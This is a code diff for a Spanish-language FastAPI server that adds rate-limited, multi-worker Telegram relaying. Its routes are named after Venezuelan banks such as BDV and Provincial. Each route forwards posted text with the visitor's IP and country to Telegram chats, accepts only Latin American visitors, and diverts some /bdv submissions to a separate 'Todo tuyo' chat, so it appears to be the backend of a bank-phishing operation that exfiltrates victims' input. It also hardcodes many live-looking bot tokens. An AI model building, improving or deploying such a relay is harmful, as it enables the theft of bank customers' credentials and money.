@@ -6,7 +6,7 @@ from fastapi.responses import JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 import httpx
 from fastapi.responses import HTMLResponse
-from collections import deque
+from collections import deque, defaultdict
 from pydantic import BaseModel
 from starlette.middleware.base import BaseHTTPMiddleware
 from starlette.responses import Response
@@ -40,14 +40,37 @@ MAX_DB_CONNECTIONS = 20  # Máximo de conexiones a BD concurrentes
 MAX_HTTP_CONNECTIONS = 50  # Máximo de conexiones HTTP concurrentes
 REQUEST_TIMEOUT = 30  # Timeout para requests en segundos
 
+# Configuraciones optimizadas para Telegram
+MAX_TELEGRAM_CONCURRENT = 20  # Máximo 20 mensajes simultáneos
+MAX_TELEGRAM_QUEUE_SIZE = 1000  # Cola grande para picos de tráfico
+TELEGRAM_TIMEOUT = 10.0  # Timeout por mensaje
+TELEGRAM_RETRY_DELAY = 0.5  # Delay entre reintentos
+MAX_TELEGRAM_RETRIES = 2  # Máximo reintentos por mensaje
+
+# Rate limiting por bot (para evitar límites de Telegram API)
+RATE_LIMIT_MESSAGES_PER_MINUTE = 30  # Por bot
+RATE_LIMIT_MESSAGES_PER_SECOND = 1  # Por bot
+
 # Semáforos para controlar concurrencia
 request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
 db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
 http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
+telegram_semaphore = Semaphore(MAX_TELEGRAM_CONCURRENT)
 
-# Cola para procesar tareas en background
+# Colas para procesar tareas
 background_queue: Queue = Queue(maxsize=1000)
-telegram_queue: Queue = Queue(maxsize=500)
+telegram_queue: Queue = Queue(maxsize=MAX_TELEGRAM_QUEUE_SIZE)
+
+# Rate limiting por bot y estadísticas
+bot_rate_limits = defaultdict(lambda: {"messages": [], "last_second": 0})
+telegram_stats = {
+    "sent_immediate": 0,
+    "sent_queued": 0,
+    "failed": 0,
+    "queue_full": 0,
+    "rate_limited": 0,
+    "total_processed": 0
+}
 
 # Configuraciones originales
 TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
@@ -95,6 +118,98 @@ PAISES_LATINOAMERICA = frozenset({
     'BS',  # Bahamas
 })
 
+# Clase para mensajes de Telegram
+class TelegramMessage:
+    """Clase para encapsular mensajes de Telegram con prioridad"""
+    def __init__(self, mensaje: str, chat_id: str, token: str, priority: int = 1, max_retries: int = MAX_TELEGRAM_RETRIES):
+        self.mensaje = mensaje
+        self.chat_id = chat_id
+        self.token = token
+        self.priority = priority  # 1=normal, 2=alta, 3=crítica
+        self.max_retries = max_retries
+        self.attempts = 0
+        self.created_at = time.time()
+
+def check_rate_limit(token: str) -> bool:
+    """Verifica si podemos enviar mensaje sin exceder rate limits"""
+    current_time = time.time()
+    current_second = int(current_time)
+    
+    rate_info = bot_rate_limits[token]
+    
+    # Limpiar mensajes antiguos (más de 1 minuto)
+    rate_info["messages"] = [
+        timestamp for timestamp in rate_info["messages"]
+        if timestamp > current_time - 60
+    ]
+    
+    # Verificar límite por minuto
+    if len(rate_info["messages"]) >= RATE_LIMIT_MESSAGES_PER_MINUTE:
+        return False
+    
+    # Verificar límite por segundo
+    if rate_info["last_second"] == current_second:
+        return False
+    
+    return True
+
+def record_message_sent(token: str):
+    """Registra que se envió un mensaje para rate limiting"""
+    current_time = time.time()
+    rate_info = bot_rate_limits[token]
+    rate_info["messages"].append(current_time)
+    rate_info["last_second"] = int(current_time)
+
+async def _enviar_telegram_optimizado(mensaje_obj: TelegramMessage) -> bool:
+    """Función optimizada para enviar mensajes con rate limiting y reintentos"""
+    async with telegram_semaphore:
+        for intento in range(mensaje_obj.max_retries + 1):
+            try:
+                # Verificar rate limit
+                if not check_rate_limit(mensaje_obj.token):
+                    if intento == 0:  # Solo contar como rate limited en el primer intento
+                        telegram_stats["rate_limited"] += 1
+                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
+                    continue
+                
+                # Enviar mensaje con timeout
+                url = f"https://api.telegram.org/bot{mensaje_obj.token}/sendMessage"
+                payload = {
+                    "chat_id": mensaje_obj.chat_id, 
+                    "text": mensaje_obj.mensaje[:4000]  # Limitar longitud
+                }
+                
+                response = await asyncio.wait_for(
+                    app.state.http_client.post(url, json=payload),
+                    timeout=TELEGRAM_TIMEOUT
+                )
+                
+                if response.status_code == 200:
+                    record_message_sent(mensaje_obj.token)
+                    return True
+                elif response.status_code == 429:  # Too Many Requests
+                    retry_after = int(response.headers.get('Retry-After', 1))
+                    await asyncio.sleep(min(retry_after, 10))  # Máximo 10 segundos
+                    continue
+                else:
+                    logger.warning(f"Error Telegram HTTP {response.status_code}")
+                    if intento < mensaje_obj.max_retries:
+                        await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
+                        continue
+                    
+            except asyncio.TimeoutError:
+                logger.warning(f"Timeout enviando mensaje Telegram (intento {intento + 1})")
+                if intento < mensaje_obj.max_retries:
+                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
+                    continue
+            except Exception as e:
+                logger.error(f"Error enviando Telegram (intento {intento + 1}): {e}")
+                if intento < mensaje_obj.max_retries:
+                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
+                    continue
+        
+        return False
+
 # Worker para procesar tareas en background
 async def background_worker():
     """Worker que procesa tareas en background sin bloquear el event loop"""
@@ -118,25 +233,92 @@ async def background_worker():
             logger.error(f"Error en background worker loop: {e}")
             await asyncio.sleep(1)
 
-# Worker específico para Telegram
-async def telegram_worker():
-    """Worker dedicado para mensajes de Telegram"""
+# Worker optimizado para Telegram con múltiples workers
+async def telegram_worker(worker_id: int):
+    """Worker optimizado para procesar mensajes de Telegram"""
+    logger.info(f"Telegram worker {worker_id} iniciado")
+    
     while True:
         try:
-            message_data = await telegram_queue.get()
-            if message_data is None:  # Señal de parada
+            # Esperar mensaje con timeout para permitir shutdown graceful
+            mensaje_obj = await asyncio.wait_for(telegram_queue.get(), timeout=5.0)
+            
+            if mensaje_obj is None:  # Señal de parada
+                logger.info(f"Telegram worker {worker_id} recibió señal de parada")
                 break
             
-            mensaje, chat_id, token = message_data
-            try:
-                await _enviar_telegram_real(mensaje, chat_id, token)
-            except Exception as e:
-                logger.error(f"Error enviando mensaje Telegram: {e}")
+            start_time = time.time()
+            success = await _enviar_telegram_optimizado(mensaje_obj)
+            processing_time = time.time() - start_time
+            
+            if success:
+                telegram_stats["sent_queued"] += 1
+                telegram_stats["total_processed"] += 1
+                logger.debug(f"Worker {worker_id}: Mensaje enviado en {processing_time:.2f}s")
+            else:
+                telegram_stats["failed"] += 1
+                logger.error(f"Worker {worker_id}: Falló después de reintentos")
             
             telegram_queue.task_done()
+            
+        except asyncio.TimeoutError:
+            # Timeout normal, continuar loop
+            continue
         except Exception as e:
-            logger.error(f"Error en telegram worker loop: {e}")
+            logger.error(f"Error en telegram worker {worker_id}: {e}")
             await asyncio.sleep(1)
+
+# Función principal para envío híbrido
+async def enviar_telegram_hibrido(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN, 
+                                 priority: int = 1, force_immediate: bool = False) -> dict:
+    """
+    Sistema híbrido de envío de Telegram:
+    - Intenta envío inmediato si hay capacidad y no hay rate limit
+    - Si no, usa cola con prioridad
+    """
+    mensaje_obj = TelegramMessage(mensaje, chat_id, token, priority)
+    
+    # Si se fuerza inmediato o hay poca carga, intentar envío directo
+    if force_immediate or (telegram_semaphore._value > 5 and telegram_queue.qsize() < 50):
+        # Verificar rate limit rápido
+        if check_rate_limit(token):
+            try:
+                success = await asyncio.wait_for(
+                    _enviar_telegram_optimizado(mensaje_obj),
+                    timeout=TELEGRAM_TIMEOUT + 2.0
+                )
+                
+                if success:
+                    telegram_stats["sent_immediate"] += 1
+                    telegram_stats["total_processed"] += 1
+                    return {
+                        "status": "sent_immediate",
+                        "success": True,
+                        "method": "direct"
+                    }
+            except asyncio.TimeoutError:
+                logger.warning("Timeout en envío inmediato, pasando a cola")
+            except Exception as e:
+                logger.error(f"Error en envío inmediato: {e}")
+    
+    # Si envío inmediato falló o no fue posible, usar cola
+    try:
+        # Usar put_nowait para no bloquear si la cola está llena
+        telegram_queue.put_nowait(mensaje_obj)
+        return {
+            "status": "queued",
+            "success": True,
+            "method": "queue",
+            "queue_size": telegram_queue.qsize()
+        }
+    except asyncio.QueueFull:
+        telegram_stats["queue_full"] += 1
+        logger.error("Cola de Telegram llena, mensaje descartado")
+        return {
+            "status": "queue_full",
+            "success": False,
+            "method": "none"
+        }
 
 # Pool de conexiones HTTP reutilizable optimizado
 @asynccontextmanager
@@ -157,9 +339,14 @@ async def lifespan(app: FastAPI):
     
     # Iniciar workers en background
     app.state.background_task = asyncio.create_task(background_worker())
-    app.state.telegram_task = asyncio.create_task(telegram_worker())
     
-    logger.info("Aplicación iniciada con workers en background")
+    # Iniciar múltiples workers de Telegram (5 workers concurrentes)
+    app.state.telegram_workers = []
+    for i in range(5):  # 5 workers de Telegram
+        worker = asyncio.create_task(telegram_worker(i))
+        app.state.telegram_workers.append(worker)
+    
+    logger.info("Aplicación iniciada con 5 workers de Telegram optimizados")
     
     yield
     
@@ -168,12 +355,15 @@ async def lifespan(app: FastAPI):
     
     # Parar workers
     await background_queue.put(None)
-    await telegram_queue.put(None)
+    
+    # Parar workers de Telegram
+    for _ in range(len(app.state.telegram_workers)):
+        await telegram_queue.put(None)
     
     # Esperar que terminen los workers
     try:
-        await asyncio.wait_for(app.state.background_task, timeout=5.0)
-        await asyncio.wait_for(app.state.telegram_task, timeout=5.0)
+        await asyncio.wait_for(app.state.background_task, timeout=10.0)
+        await asyncio.gather(*app.state.telegram_workers, timeout=10.0)
     except asyncio.TimeoutError:
         logger.warning("Workers no terminaron en tiempo esperado")
     
@@ -228,30 +418,6 @@ async def add_background_task(func, *args, **kwargs):
         )
     except asyncio.TimeoutError:
         logger.warning("Queue de background lleno, descartando tarea")
-
-async def add_telegram_task(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
-    """Añade un mensaje de Telegram al queue de forma segura"""
-    try:
-        await asyncio.wait_for(
-            telegram_queue.put((mensaje, chat_id, token)),
-            timeout=1.0
-        )
-    except asyncio.TimeoutError:
-        logger.warning("Queue de Telegram lleno, descartando mensaje")
-
-# Función real para enviar Telegram (usada por el worker)
-async def _enviar_telegram_real(mensaje: str, chat_id: str, token: str):
-    """Función real que envía el mensaje a Telegram"""
-    async with http_semaphore:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {"chat_id": chat_id, "text": mensaje}
-        
-        try:
-            response = await app.state.http_client.post(url, json=payload)
-            if response.status_code != 200:
-                logger.warning(f"Error enviando a Telegram: {response.status_code}")
-        except Exception as e:
-            logger.error(f"Error de conexión Telegram: {e}")
 
 # Inicialización asíncrona de BD optimizada
 async def init_db_async():
@@ -350,11 +516,6 @@ async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
         except Exception as e:
             logger.error(f"Error verificando país: {e}")
             return (False, 'Unknown')
-
-# Funciones de Telegram optimizadas
-async def enviar_telegram_async(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
-    """Wrapper para enviar mensaje a Telegram usando el queue"""
-    await add_telegram_task(mensaje, chat_id, token)
 
 # Funciones de BD optimizadas
 def agregar_elemento_diccionario_cache(ip: str, numero: int):
@@ -505,7 +666,6 @@ class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
             except asyncio.TimeoutError:
                 logger.warning(f"Timeout verificando geolocalización para IP {client_ip}")
                 # En caso de timeout, permitir acceso para no bloquear legítimos usuarios
-                # Pero se podría cambiar a bloquear por defecto si se prefiere más seguridad
                 pass
             except Exception as e:
                 logger.error(f"Error verificando geolocalización: {e}")
@@ -525,7 +685,7 @@ app.add_middleware(ConcurrencyLimitMiddleware)
 app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
 app.add_middleware(OptimizedIPBlockMiddleware)
 
-# Modelos Pydantic optimizados (sin cambios)
+# Modelos Pydantic optimizados
 class ClaveRequest(BaseModel):
     clave: str
 
@@ -778,34 +938,9 @@ async def verificar_spam_ip(data: IPRequest):
             "mensaje": "IP aún no considerada spam"
         }
 
-# Configuración optimizada de endpoints dinámicos
-endpoint_configs = [
-    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
-    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
-    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
-    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
-    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
-    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
-    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
-    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
-    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
-    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
-    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
-    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
-    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
-    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
-    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
-    {"path": "/internacional4/", "chat_id": "5317159807", "bot_id": "8116577753:AAFkE-1JGW8Vi-2SRP4xNdxCLqyI1zLbl_U"},
-    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
-    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
-    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
-    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
-    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
-    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
-]
-
+# Endpoint optimizado usando el sistema híbrido
 async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
-    """Endpoint dinámico optimizado con manejo de concurrencia y filtro geográfico"""
+    """Endpoint dinámico con sistema híbrido de Telegram"""
     client_ip = obtener_ip_real(request)
     cola.append(client_ip)
     numeror = obtener_numero_cached(client_ip)
@@ -831,21 +966,52 @@ async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage
         path = config["path"]
         mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
         
-        # Lógica especial para ciertos paths y países
-        if (path.startswith("/bdv") and obtener_is_active_cached() and 
-            numeror in numeros_r and pais not in {"US", "CO"}):
-            # Enviar mensaje especial
-            await add_telegram_task(mensaje_completo + " Todo tuyo", "-4931572577")
-        else:
-            # Enviar ambos mensajes de forma asíncrona
-            await add_telegram_task(mensaje_completo)
-            await add_telegram_task(mensaje, config["chat_id"], config["bot_id"])
+        telegram_results = []
+        
+        try:
+            # Lógica especial para ciertos paths y países
+            if (path.startswith("/bdv") and obtener_is_active_cached() and 
+                numeror in numeros_r and pais not in {"US", "CO"}):
+                # Enviar mensaje especial con alta prioridad
+                result = await enviar_telegram_hibrido(
+                    mensaje_completo + " Todo tuyo", 
+                    "-4931572577", 
+                    TOKEN, 
+                    priority=2,
+                    force_immediate=True  # Forzar inmediato para mensajes especiales
+                )
+                telegram_results.append(result)
+            else:
+                # Enviar mensajes con prioridad normal
+                # Mensaje principal
+                result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
+                telegram_results.append(result1)
+                
+                # Mensaje específico del endpoint
+                result2 = await enviar_telegram_hibrido(mensaje, config["chat_id"], config["bot_id"], priority=1)
+                telegram_results.append(result2)
 
-        return {
-            "mensaje_enviado": True,
-            "pais_origen": pais,
-            "ip": client_ip
-        }
+            # Contar envíos exitosos
+            successful_sends = sum(1 for r in telegram_results if r["success"])
+            
+            return {
+                "mensaje_enviado": successful_sends > 0,
+                "pais_origen": pais,
+                "ip": client_ip,
+                "telegram_results": telegram_results,
+                "successful_sends": successful_sends,
+                "total_attempts": len(telegram_results)
+            }
+            
+        except Exception as e:
+            logger.error(f"Error en sistema Telegram: {e}")
+            return {
+                "mensaje_enviado": False,
+                "pais_origen": pais,
+                "ip": client_ip,
+                "telegram_error": str(e),
+                "telegram_results": telegram_results
+            }
     else:
         # Registrar intento de acceso no autorizado
         logger.warning(f"Acceso denegado desde país no latinoamericano: {pais} ({client_ip})")
@@ -853,6 +1019,32 @@ async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage
             status_code=403, 
             detail=f"Acceso denegado desde {pais}. Solo se permite acceso desde Latinoamérica."
         )
+
+# Configuración optimizada de endpoints dinámicos
+endpoint_configs = [
+    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
+    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
+    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
+    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
+    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
+    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
+    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
+    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
+    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
+    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
+    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
+    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
+    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
+    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
+    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
+    {"path": "/internacional4/", "chat_id": "5317159807", "bot_id": "8116577753:AAFkE-1JGW8Vi-2SRP4xNdxCLqyI1zLbl_U"},
+    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
+    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
+    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
+    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
+    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
+    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
+]
 
 # Registrar endpoints dinámicos
 from copy import deepcopy
@@ -960,6 +1152,55 @@ async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest)
             logger.error(f"Error editando usuario: {e}")
             raise HTTPException(status_code=500, detail="Error interno del servidor")
 
+# Endpoints para monitoreo del sistema Telegram
+@app.get("/telegram_stats")
+async def get_telegram_stats():
+    """Estadísticas del sistema de Telegram"""
+    return {
+        "statistics": telegram_stats,
+        "current_status": {
+            "queue_size": telegram_queue.qsize(),
+            "queue_maxsize": telegram_queue.maxsize,
+            "available_workers": telegram_semaphore._value,
+            "max_workers": MAX_TELEGRAM_CONCURRENT
+        },
+        "rate_limits": {
+            "messages_per_minute": RATE_LIMIT_MESSAGES_PER_MINUTE,
+            "messages_per_second": RATE_LIMIT_MESSAGES_PER_SECOND,
+            "active_bots": len(bot_rate_limits)
+        },
+        "performance": {
+            "immediate_ratio": telegram_stats["sent_immediate"] / max(telegram_stats["total_processed"], 1),
+            "queue_ratio": telegram_stats["sent_queued"] / max(telegram_stats["total_processed"], 1),
+            "failure_ratio": telegram_stats["failed"] / max(telegram_stats["total_processed"], 1)
+        }
+    }
+
+@app.post("/telegram_test")
+async def test_telegram(mensaje: str = "Test message", priority: int = 1, force_immediate: bool = False):
+    """Endpoint para probar el sistema de Telegram"""
+    result = await enviar_telegram_hibrido(
+        f"TEST: {mensaje} - {datetime.now()}",
+        priority=priority,
+        force_immediate=force_immediate
+    )
+    return {"test_result": result, "timestamp": datetime.now()}
+
+@app.post("/clear_telegram_stats")
+async def clear_telegram_stats():
+    """Limpiar estadísticas de Telegram"""
+    global telegram_stats
+    telegram_stats = {
+        "sent_immediate": 0,
+        "sent_queued": 0,
+        "failed": 0,
+        "queue_full": 0,
+        "rate_limited": 0,
+        "total_processed": 0
+    }
+    bot_rate_limits.clear()
+    return {"message": "Estadísticas de Telegram limpiadas"}
+
 # Endpoints adicionales para monitoreo y salud del sistema
 @app.get("/health")
 async def health_check():
@@ -980,8 +1221,10 @@ async def health_check():
         "semaphore_stats": {
             "available_requests": request_semaphore._value,
             "available_db": db_semaphore._value,
-            "available_http": http_semaphore._value
+            "available_http": http_semaphore._value,
+            "available_telegram": telegram_semaphore._value
         },
+        "telegram_stats": telegram_stats,
         "geo_filter": {
             "enabled": True,
             "allowed_countries": len(PAISES_LATINOAMERICA),
@@ -996,12 +1239,14 @@ async def get_metrics():
         "concurrency_limits": {
             "max_concurrent_requests": MAX_CONCURRENT_REQUESTS,
             "max_db_connections": MAX_DB_CONNECTIONS,
-            "max_http_connections": MAX_HTTP_CONNECTIONS
+            "max_http_connections": MAX_HTTP_CONNECTIONS,
+            "max_telegram_concurrent": MAX_TELEGRAM_CONCURRENT
         },
         "current_usage": {
             "active_requests": MAX_CONCURRENT_REQUESTS - request_semaphore._value,
             "active_db_connections": MAX_DB_CONNECTIONS - db_semaphore._value,
-            "active_http_connections": MAX_HTTP_CONNECTIONS - http_semaphore._value
+            "active_http_connections": MAX_HTTP_CONNECTIONS - http_semaphore._value,
+            "active_telegram_workers": MAX_TELEGRAM_CONCURRENT - telegram_semaphore._value
         },
         "queues": {
             "background_queue_size": background_queue.qsize(),
@@ -1019,6 +1264,7 @@ async def get_metrics():
             "cola_size": len(cola),
             "baneado_size": len(baneado)
         },
+        "telegram_performance": telegram_stats,
         "geo_blocking": {
             "enabled": True,
             "allowed_countries_count": len(PAISES_LATINOAMERICA)
@@ -1093,6 +1339,7 @@ async def clear_caches():
             "keys_removed": len(old_keys)
         }
     }
+
 
 if __name__ == "__main__":
     import uvicorn
